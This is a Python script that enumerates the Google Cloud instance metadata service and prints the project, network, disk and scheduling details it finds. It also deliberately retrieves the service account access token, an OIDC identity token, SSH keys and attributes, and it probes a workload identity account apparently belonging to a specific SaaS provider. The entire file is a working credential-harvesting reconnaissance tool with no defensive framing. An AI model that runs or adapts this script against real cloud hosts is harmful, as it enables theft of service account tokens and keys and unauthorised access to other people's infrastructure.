#!/usr/bin/env python3
import urllib.request
import urllib.error
import json

BASE_URL = "http://169.254.169.254/computeMetadata/v1"
HEADERS = {"Metadata-Flavor": "Google"}

def query_metadata(path, description):
    """Query a metadata endpoint and return the response"""
    url = f"{BASE_URL}{path}"
    print(f"\n{'='*80}")
    print(f"ENDPOINT: {path}")
    print(f"DESCRIPTION: {description}")
    print(f"URL: {url}")
    print("-" * 80)
    
    try:
        req = urllib.request.Request(url, headers=HEADERS)
        with urllib.request.urlopen(req, timeout=2) as response:
            content = response.read().decode('utf-8', errors='ignore')
            status = response.status
            
            print(f"STATUS: {status} OK")
            print(f"RESPONSE:")
            print(content)
            
            return content
    except urllib.error.HTTPError as e:
        print(f"HTTP ERROR: {e.code} {e.reason}")
        try:
            error_content = e.read().decode('utf-8', errors='ignore')
            print(f"ERROR RESPONSE: {error_content}")
        except:
            pass
    except urllib.error.URLError as e:
        print(f"URL ERROR: {e.reason}")
    except Exception as e:
        print(f"ERROR: {type(e).__name__}: {e}")
    
    return None

print("="*80)
print("GCP METADATA SERVICE ENUMERATION")
print("="*80)

# PROJECT METADATA
print("\n" + "="*80)
print("SECTION 1: PROJECT METADATA")
print("="*80)

query_metadata("/project/project-id", "Project ID")
query_metadata("/project/numeric-project-id", "Numeric Project ID")
query_metadata("/project/attributes/", "Project-wide custom attributes")

# INSTANCE BASICS
print("\n" + "="*80)
print("SECTION 2: INSTANCE BASICS")
print("="*80)

query_metadata("/instance/id", "Instance ID")
query_metadata("/instance/name", "Instance name")
query_metadata("/instance/hostname", "Instance hostname")
query_metadata("/instance/zone", "Instance zone")
query_metadata("/instance/machine-type", "Machine type")
query_metadata("/instance/description", "Instance description")

# NETWORK
print("\n" + "="*80)
print("SECTION 3: NETWORK INFORMATION")
print("="*80)

query_metadata("/instance/network-interfaces/", "Network interfaces list")
query_metadata("/instance/network-interfaces/0/ip", "Internal IP")
query_metadata("/instance/network-interfaces/0/network", "Network")
query_metadata("/instance/network-interfaces/0/subnetwork", "Subnetwork")
query_metadata("/instance/network-interfaces/0/access-configs/0/external-ip", "External IP")
query_metadata("/instance/network-interfaces/0/mac", "MAC address")

# SERVICE ACCOUNTS (CRITICAL)
print("\n" + "="*80)
print("SECTION 4: SERVICE ACCOUNTS (CRITICAL)")
print("="*80)

query_metadata("/instance/service-accounts/", "List of service accounts")
query_metadata("/instance/service-accounts/default/", "Default service account info")
query_metadata("/instance/service-accounts/default/email", "Service account email")
query_metadata("/instance/service-accounts/default/scopes", "Service account scopes")
query_metadata("/instance/service-accounts/default/token", "Access token (SENSITIVE!)")
query_metadata("/instance/service-accounts/default/identity?audience=https://www.googleapis.com", "OIDC identity token")

# Check the workload identity account too
query_metadata("/instance/service-accounts/scalr-iacp-saas.svc.id.goog/email", "Workload identity email")
query_metadata("/instance/service-accounts/scalr-iacp-saas.svc.id.goog/scopes", "Workload identity scopes")

# TAGS & ATTRIBUTES
print("\n" + "="*80)
print("SECTION 5: TAGS & ATTRIBUTES")
print("="*80)

query_metadata("/instance/tags", "Instance tags")
query_metadata("/instance/attributes/", "Instance custom attributes")

# SCHEDULING
print("\n" + "="*80)
print("SECTION 6: SCHEDULING")
print("="*80)

query_metadata("/instance/scheduling/", "Scheduling options")
query_metadata("/instance/scheduling/automatic-restart", "Automatic restart")
query_metadata("/instance/scheduling/on-host-maintenance", "On host maintenance")
query_metadata("/instance/scheduling/preemptible", "Preemptible instance")
query_metadata("/instance/scheduling/maintenance-event", "Maintenance event status")

# DISKS
print("\n" + "="*80)
print("SECTION 7: DISKS")
print("="*80)

query_metadata("/instance/disks/", "Attached disks")

# SSH KEYS
print("\n" + "="*80)
print("SECTION 8: SSH KEYS")
print("="*80)

query_metadata("/instance/attributes/ssh-keys", "SSH keys")
query_metadata("/project/attributes/ssh-keys", "Project SSH keys")

# GUEST ATTRIBUTES
print("\n" + "="*80)
print("SECTION 9: GUEST ATTRIBUTES")
print("="*80)

query_metadata("/instance/guest-attributes/", "Guest attributes")

# CPU & LICENSES
print("\n" + "="*80)
print("SECTION 10: MISC")
print("="*80)

query_metadata("/instance/cpu-platform", "CPU platform")
query_metadata("/instance/licenses/", "Licenses")
query_metadata("/instance/virtual-clock/drift-token", "Virtual clock drift token")

print("\n" + "="*80)
print("ENUMERATION COMPLETE")
print("="*80)